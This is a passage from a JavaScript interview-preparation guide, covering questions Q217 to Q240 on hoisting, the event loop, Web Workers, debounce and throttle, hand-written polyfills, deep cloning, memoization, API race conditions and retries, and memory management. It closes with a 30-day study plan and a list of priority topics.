
**A:** Every execution context runs in two passes: the **creation phase** sets up memory (hoists `var`s as `undefined`, hoists function declarations fully, and creates `this`) before any code runs; the **execution phase** then runs the code line by line, assigning actual values.

```javascript
console.log(x); // undefined - hoisted and initialized during creation phase
console.log(foo()); // "hi" - fully hoisted during creation phase

var x = 5; // execution phase: x is now actually assigned 5
function foo() {
  return "hi";
}
```

**Trap:** This two-phase model is the actual mechanism *behind* hoisting (Q11) — being able to explain hoisting in terms of "creation phase sets up undefined bindings first" is a noticeably stronger answer than just saying "declarations move to the top."

### Q218. How does hoisting work internally?

**A:** During the creation phase (Q217), the engine scans the code, allocates memory for every `var`/function declaration in the current scope, initializes `var`s to `undefined` and fully hoists function declarations — `let`/`const` are allocated but left uninitialized (the TDZ, Q13).

```javascript
function example() {
  console.log(a); // undefined - allocated + initialized in creation phase
  console.log(fn()); // works - function fully hoisted
  console.log(b); // ReferenceError - TDZ, allocated but not initialized

  var a = 1;
  let b = 2;
  function fn() {
    return "hoisted";
  }
}
example();
```

**Trap:** Hoisting isn't literally "moving code to the top" (a common but imprecise mental model) — it's that the engine pre-scans and allocates memory for declarations before executing anything, which produces the same observable effect without actually relocating any code.

### Q219. How does the event loop affect React rendering and browser responsiveness? *(new)*

**A:** React state updates and DOM rendering work happen within the browser's rendering pipeline, which itself competes with the event loop's task queues — long-running synchronous JS (a big `for` loop, a slow computation) blocks the main thread entirely, including React's ability to re-render or respond to input.

```javascript
function handleClick() {
  setLoading(true); // React schedules a re-render (batched)

  for (let i = 0; i < 5_000_000_000; i++) {} // blocks the main thread synchronously

  // The "loading" UI never actually PAINTS until this loop finishes,
  // even though setLoading(true) was already called - the browser can't
  // paint or process other events while the call stack is busy
}
```

**Trap:** React 18's concurrent rendering can yield back to the browser between chunks of rendering work for large trees, but it cannot interrupt YOUR synchronous code — a heavy computation inside an event handler still blocks everything regardless of React version; that's a job for a Web Worker (Q138) or breaking work into smaller async chunks.

### Q220. How do you optimize expensive JavaScript operations in the browser?

**A:**

```javascript
// 1. Debounce/throttle high-frequency triggers (Q194/195)
// 2. Move heavy computation off the main thread
const worker = new Worker("heavy-calc.js");

// 3. Break large synchronous work into chunks, yielding control back
function processLargeArray(arr, i = 0) {
  const chunkEnd = Math.min(i + 1000, arr.length);
  for (; i < chunkEnd; i++) {
    /* process arr[i] */
  }
  if (i < arr.length) {
    setTimeout(() => processLargeArray(arr, i), 0); // yield, then continue
  }
}

// 4. Memoize expensive pure computations (Q41/230)
// 5. Use requestIdleCallback for genuinely low-priority work
requestIdleCallback(() => {
  /* do work when the browser is idle */
});
```

**Trap:** `setTimeout(fn, 0)` as a "yield point" is a real, commonly used technique — it lets queued microtasks, rendering, and user input processing happen between chunks, even though it feels like a hack.

### Q221. How do you avoid blocking the main thread?

**A:** Offload genuinely CPU-heavy work to a Web Worker, chunk synchronous work with yield points, and avoid synchronous operations that block (like synchronous XHR, or `while` loops waiting on a condition).

```javascript
// Bad - blocks everything for however long this takes
function blockingSort(arr) {
  return arr.sort((a, b) => expensiveComparator(a, b));
}

// Better - run in a Worker
const worker = new Worker("sort-worker.js");
worker.postMessage(arr);
worker.onmessage = (e) => console.log("Sorted:", e.data);
```

**Trap:** The main thread also handles layout, paint, and user input — a blocked main thread isn't just "slow JS," it's a frozen, unresponsive page from the user's perspective, which is why this matters more than raw execution speed alone.

### Q222. When should you use Web Workers?

**A:** For genuinely CPU-intensive, long-running JS work that would otherwise freeze the UI — large data processing/parsing, image/video manipulation, complex calculations — NOT for simple async I/O (which `fetch`/Promises already handle without blocking).

```javascript
// GOOD use case: heavy computation
const worker = new Worker("prime-calculator.js");
worker.postMessage({ upTo: 10_000_000 });

// UNNECESSARY use case: a simple fetch (already async, doesn't need a Worker)
fetch("/api/data").then((res) => res.json()); // this never blocks the main thread anyway
```

**Trap:** A common misconception is that Workers make network requests "faster" — `fetch` is already non-blocking without a Worker; Workers only help when the bottleneck is actual **CPU computation**, not I/O waiting.

### Q223. How do you design a debounce function from scratch?

**A:**

```javascript
function debounce(fn, delay) {
  let timeoutId;
  return function (...args) {
    clearTimeout(timeoutId); // cancel any pending call
    timeoutId = setTimeout(() => fn.apply(this, args), delay);
  };
}

const search = debounce((query) => console.log("Searching:", query), 300);
search("a");
search("ab");
search("abc"); // only THIS call actually fires, 300ms after the last keystroke
```

**Trap:** Using `fn.apply(this, args)` (not just `fn(...args)`) preserves the correct `this` context if `debounce` is used as an object method — an easy detail to forget that breaks `this`-dependent callbacks.

### Q224. How do you design a throttle function from scratch?

**A:**

```javascript
function throttle(fn, limit) {
  let inThrottle = false;
  return function (...args) {
    if (!inThrottle) {
      fn.apply(this, args);
      inThrottle = true;
      setTimeout(() => (inThrottle = false), limit);
    }
  };
}

const onScroll = throttle(() => console.log("scroll handled"), 200);
window.addEventListener("scroll", onScroll); // fires at most every 200ms
```

**Trap:** A common follow-up: this "leading edge" implementation fires immediately on the first call, then ignores calls until the cooldown ends — interviewers sometimes ask for a "trailing edge" variant too (fire once more after the cooldown if calls happened during it), which requires a bit more bookkeeping.

### Q225. How do you implement custom `Promise.all()`? *(new)*

**A:**

```javascript
function myPromiseAll(promises) {
  return new Promise((resolve, reject) => {
    const results = [];
    let completed = 0;

    if (promises.length === 0) return resolve([]);

    promises.forEach((p, index) => {
      Promise.resolve(p)
        .then((value) => {
          results[index] = value; // preserve original order, not completion order
          completed++;
          if (completed === promises.length) resolve(results);
        })
        .catch(reject); // fail-fast: first rejection rejects the whole thing
    });
  });
}

myPromiseAll([Promise.resolve(1), Promise.resolve(2), Promise.resolve(3)]).then((r) =>
  console.log(r),
); // [1, 2, 3]
```

**Trap:** Results must be placed at `results[index]`, not pushed in completion order — since promises can resolve out of order, but `Promise.all()`'s contract guarantees the result array matches the INPUT order.

### Q226. How do you implement custom `Array.prototype.map()`?

**A:**

```javascript
Array.prototype.myMap = function (callback, thisArg) {
  const result = [];
  for (let i = 0; i < this.length; i++) {
    if (i in this) {
      // respects sparse arrays (see Q78) - skips holes
      result[i] = callback.call(thisArg, this[i], i, this);
    }
  }
  return result;
};

[1, 2, 3].myMap((x) => x * 2); // [2, 4, 6]
```

**Trap:** The real `map()` skips holes in sparse arrays and supports a `thisArg` second parameter — both easy to forget when reimplementing it, and exactly what interviewers check for in a "polyfill" question.

### Q227. How do you implement custom `Array.prototype.filter()`?

**A:**

```javascript
Array.prototype.myFilter = function (callback, thisArg) {
  const result = [];
  for (let i = 0; i < this.length; i++) {
    if (i in this && callback.call(thisArg, this[i], i, this)) {
      result.push(this[i]);
    }
  }
  return result;
};

[1, 2, 3, 4].myFilter((x) => x % 2 === 0); // [2, 4]
```

**Trap:** Same sparse-array-skipping (`i in this`) detail as `map` — a thorough implementation checks for it even though most interview answers skip this edge case.

### Q228. How do you implement custom `Array.prototype.reduce()`?

**A:**

```javascript
Array.prototype.myReduce = function (callback, initialValue) {
  let acc = initialValue;
  let startIndex = 0;

  if (acc === undefined) {
    if (this.length === 0) throw new TypeError("Reduce of empty array with no initial value");
    acc = this[0];
    startIndex = 1;
  }

  for (let i = startIndex; i < this.length; i++) {
    acc = callback(acc, this[i], i, this);
  }
  return acc;
};

[1, 2, 3, 4].myReduce((sum, x) => sum + x, 0); // 10
[1, 2, 3, 4].myReduce((sum, x) => sum + x); // 10 - no initial value, uses this[0]
```

**Trap:** The "no initial value provided" branch is the part almost everyone gets wrong on the first try — real `reduce()` uses the first element as the accumulator and starts iterating from index 1, and throws on an empty array with no initial value.

### Q229. How do you implement deep clone?

**A:**

```javascript
function deepClone(obj, seen = new WeakMap()) {
  if (obj === null || typeof obj !== "object") return obj; // primitives - return as-is
  if (seen.has(obj)) return seen.get(obj); // handle circular references

  const clone = Array.isArray(obj) ? [] : {};
  seen.set(obj, clone);

  for (const key in obj) {
    if (Object.prototype.hasOwnProperty.call(obj, key)) {
      clone[key] = deepClone(obj[key], seen);
    }
  }
  return clone;
}

const original = { a: 1, nested: { b: 2 } };
original.self = original; // circular reference
const clone = deepClone(original);
clone.nested.b = 99;
console.log(original.nested.b); // 2 - independent
console.log(clone.self === clone); // true - circular reference preserved correctly
```

**Trap:** Handling circular references (via the `seen` WeakMap tracking already-cloned objects) is exactly what separates a senior-level answer from a naive recursive clone that would otherwise infinite-loop and crash. For production code, `structuredClone()` (Q168) handles this natively and should be preferred over a hand-rolled version.

### Q230. How do you implement memoization?

**A:**

```javascript
function memoize(fn) {
  const cache = new Map();
  return function (...args) {
    const key = JSON.stringify(args);
    if (cache.has(key)) return cache.get(key); // cache hit
    const result = fn.apply(this, args);
    cache.set(key, result);
    return result;
  };
}

const slowSquare = (n) => {
  for (let i = 0; i < 1e8; i++) {} // simulate expensive work
  return n * n;
};
const fastSquare = memoize(slowSquare);
fastSquare(5); // slow the first time
fastSquare(5); // instant - served from cache
```

**Trap:** `JSON.stringify(args)` as the cache key breaks down for non-serializable arguments (functions, `undefined`, circular objects) and for object arguments where key order might differ — fine for simple primitive-argument functions, but not a universal solution.

### Q231. How do you implement currying?

**A:**

```javascript
function curry(fn) {
  return function curried(...args) {
    if (args.length >= fn.length) return fn.apply(this, args);
    return (...next) => curried.apply(this, [...args, ...next]);
  };
}

const sum3 = curry((a, b, c) => a + b + c);
sum3(1, 2, 3); // 6 - all at once
sum3(1)(2)(3); // 6 - one at a time
sum3(1, 2)(3); // 6 - mixed
```

**Trap:** `fn.length` (used to know how many arguments to wait for) doesn't count rest parameters or parameters with default values — `curry((a, b, ...rest) => {})` would have `fn.length === 2`, silently ignoring the rest params in the arity check.

### Q232. How do you implement an event emitter/pub-sub?

**A:**

```javascript
class EventEmitter {
  #events = new Map();

  on(event, listener) {
    if (!this.#events.has(event)) this.#events.set(event, []);
    this.#events.get(event).push(listener);
    return this; // chainable
  }

  off(event, listener) {
    const listeners = this.#events.get(event) || [];
    this.#events.set(event, listeners.filter((l) => l !== listener));
  }

  emit(event, ...args) {
    (this.#events.get(event) || []).forEach((listener) => listener(...args));
  }
}

const emitter = new EventEmitter();
const onUserLogin = (name) => console.log(`${name} logged in`);
emitter.on("login", onUserLogin);
emitter.emit("login", "John"); // "John logged in"
emitter.off("login", onUserLogin);
```

**Trap:** A production-grade version needs to guard against a listener that removes itself (or another listener) *while* `emit` is iterating — iterating over a snapshot/copy of the listeners array avoids skipping entries due to mutation during iteration.

### Q233. How do you handle race conditions in API calls? *(new)*

**A:** The classic problem: two requests fire (e.g., search-as-you-type), but the *older* one resolves *after* the newer one, overwriting fresher data with stale results. Fix with a request ID/token check, or `AbortController`.

```javascript
let latestRequestId = 0;

async function search(query) {
  const requestId = ++latestRequestId;
  const results = await fetch(`/api/search?q=${query}`).then((r) => r.json());

  if (requestId !== latestRequestId) return; // a newer request has since started - discard this stale result
  renderResults(results);
}

// Alternative: AbortController - cancel the actual in-flight request
let controller;
async function searchWithAbort(query) {
  controller?.abort(); // cancel any previous in-flight request
  controller = new AbortController();
  const results = await fetch(`/api/search?q=${query}`, { signal: controller.signal }).then((r) =>
    r.json(),
  );
  renderResults(results);
}
```

**Trap:** Debouncing (Q194) reduces HOW OFTEN requests fire, but doesn't guarantee response ORDER — even a debounced search can still race if network latency varies, so race-condition handling is a genuinely separate concern from debouncing.

### Q234. How do you prevent duplicate API calls? *(new)*

**A:** Track in-flight requests and return the existing Promise instead of firing a new one, for the same logical request.

```javascript
const pendingRequests = new Map();

function dedupedFetch(url) {
  if (pendingRequests.has(url)) {
    return pendingRequests.get(url); // reuse the in-flight request
  }
  const promise = fetch(url)
    .then((res) => res.json())
    .finally(() => pendingRequests.delete(url)); // clean up once settled

  pendingRequests.set(url, promise);
  return promise;
}

// Both calls made in quick succession share the SAME underlying request:
dedupedFetch("/api/user/1");
dedupedFetch("/api/user/1"); // returns the same pending Promise, no second network call
```

**Trap:** The `.finally()` cleanup is essential — without it, the cache entry never gets removed, meaning after the request completes you'd keep returning a stale, already-resolved Promise for every future call to that URL.

### Q235. How do you retry failed API calls? *(new)*

**A:** Wrap the request in a retry loop with a delay (ideally exponential backoff) between attempts, and a maximum retry count.

```javascript
async function fetchWithRetry(url, retries = 3, backoff = 500) {
  try {
    const res = await fetch(url);
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    return await res.json();
  } catch (err) {
    if (retries === 0) throw err;
    await new Promise((resolve) => setTimeout(resolve, backoff));
    return fetchWithRetry(url, retries - 1, backoff * 2); // exponential backoff
  }
}
```

**Trap:** Blindly retrying every failure is a mistake — retry only on transient errors (network failures, 5xx server errors), never on 4xx client errors (like 401/404), since retrying a request that's fundamentally wrong just wastes time and load.

### Q236. How do you cancel stale API requests?

**A:** `AbortController`, tied to whatever triggers the "this response is no longer needed" condition (component unmount, a newer request superseding it, user navigating away).

```javascript
function useSearch(query) {
  useEffect(() => {
    const controller = new AbortController();

    fetch(`/api/search?q=${query}`, { signal: controller.signal })
      .then((res) => res.json())
      .then(setResults)
      .catch((err) => {
        if (err.name !== "AbortError") console.error(err); // ignore expected aborts
      });

    return () => controller.abort(); // cleanup: cancel if query changes or component unmounts
  }, [query]);
}
```

**Trap:** This is the React `useEffect` cleanup pattern specifically designed for this problem — forgetting the `return () => controller.abort()` cleanup is one of the most common sources of the "setState on unmounted component" warning.

### Q237. How do you handle large JSON data in the frontend? *(new)*

**A:** Avoid parsing/rendering everything at once — paginate or stream from the server if possible, virtualize long lists (render only visible rows), and move heavy parsing/filtering off the main thread if it's unavoidably large.

```javascript
// 1. Virtualization - only render visible rows (conceptual; libraries like
//    react-window / react-virtualized implement this properly)
function getVisibleRows(allRows, scrollTop, rowHeight, viewportHeight) {
  const startIndex = Math.floor(scrollTop / rowHeight);
  const endIndex = startIndex + Math.ceil(viewportHeight / rowHeight);
  return allRows.slice(startIndex, endIndex);
}

// 2. Process large JSON off the main thread
const worker = new Worker("json-processor.js");
worker.postMessage(hugeJsonString);
worker.onmessage = (e) => console.log("Processed:", e.data);

// 3. Prefer streaming/pagination over one giant payload wherever the API allows it
```

**Trap:** `JSON.parse()` on a genuinely huge string (tens of MB+) is itself synchronous and blocks the main thread — moving that parsing into a Web Worker is a real, necessary technique, not just an optimization nicety, once payloads get large enough.

### Q238. How do you improve JavaScript bundle performance?

**A:**

```javascript
// 1. Tree shaking (Q191) - eliminate unused exports (relies on ES modules)
// 2. Code splitting (Q192) - load only what's needed per route/feature
const Dashboard = React.lazy(() => import("./Dashboard"));

// 3. Minification/compression (handled by build tools - Terser, Brotli/gzip)
// 4. Analyze what's actually IN the bundle before optimizing blindly:
//    `npx webpack-bundle-analyzer` or Vite's built-in visualizer plugin

// 5. Avoid large dependencies for small needs (e.g. a whole date library for one format call)
```

**Trap:** "Optimize the bundle" without first measuring what's actually large is a common wrong first move — always profile with a bundle analyzer before guessing at what to cut or split.

### Q239. How do you debug production JavaScript errors? *(new)*

**A:** Source maps to map minified stack traces back to original code, an error-monitoring service (Sentry, Datadog, etc.) to capture errors with context, and structured logging around critical operations.

```javascript
// 1. Upload source maps to your error monitoring service at deploy time
//    (never ship source maps publicly if the code is proprietary - upload separately)

// 2. Global error handlers report to the monitoring service (see Q175-177)
window.addEventListener("error", (e) => {
  errorMonitoringService.captureException(e.error, {
    url: window.location.href,
    userAgent: navigator.userAgent,
  });
});

window.addEventListener("unhandledrejection", (e) => {
  errorMonitoringService.captureException(e.reason);
});

// 3. Add breadcrumbs / context before risky operations for easier reproduction
```

**Trap:** Without source maps uploaded to your monitoring tool, production error stack traces are just minified, unreadable gibberish (`at t.a (main.a3f1.js:1:24521)`) — this is one of the most commonly forgotten deploy steps that silently cripples debugging capability.

### Q240. How do you explain JavaScript memory management in an interview?

**A:** A clean, structured answer: JS allocates memory automatically (variable declarations, object creation), and frees it automatically via garbage collection (mark-and-sweep — Q188) once objects become unreachable. As the engineer, your job is to avoid *unintentionally* keeping things reachable (leaks — Q185/186), and to use weak references (`WeakMap`/`WeakSet` — Q190) when you want to associate data with an object's lifecycle without controlling it.

```javascript
// A concise structure to walk through out loud:
// 1. Allocation - happens automatically (object literals, function calls, etc.)
// 2. Use - reading/writing the allocated memory
// 3. Release - garbage collector frees memory once nothing references it anymore
// 4. Common leak sources - forgotten listeners/timers, growing caches, detached DOM nodes
// 5. Tools - Chrome DevTools Memory tab (heap snapshots, allocation timelines)
```

**Trap:** The strongest answers connect the theory to something concrete you've actually debugged (a specific leak you found and fixed) — reciting the mark-and-sweep algorithm alone reads as memorized; pairing it with a real diagnostic story (Q187's heap-snapshot workflow) reads as senior-level.

---

## Suggested Preparation Order

1. **Day 1–3:** Phase 1 and Phase 2
2. **Day 4–6:** Phase 3 and Phase 4
3. **Day 7–10:** Phase 5 deeply with code examples
4. **Day 11–13:** Phase 6 and browser APIs
5. **Day 14–16:** Phase 7 modern JS
6. **Day 17–19:** Phase 8 performance/security
7. **Day 20–23:** Phase 9 output-based questions
8. **Day 24–30:** Phase 10 senior-level implementation and architecture questions

---

## High Priority for 6 Years Frontend Engineer

Focus extra on:

- Closures
- Hoisting
- Event loop
- Promises
- Async/await
- `this`, call, apply, bind
- Prototype and inheritance
- Debounce/throttle
- Shallow vs deep copy
- Memory leaks
- Browser storage
- Event delegation
- Web Workers
- JavaScript performance
- Output-based tricky questions
- Polyfills and custom implementations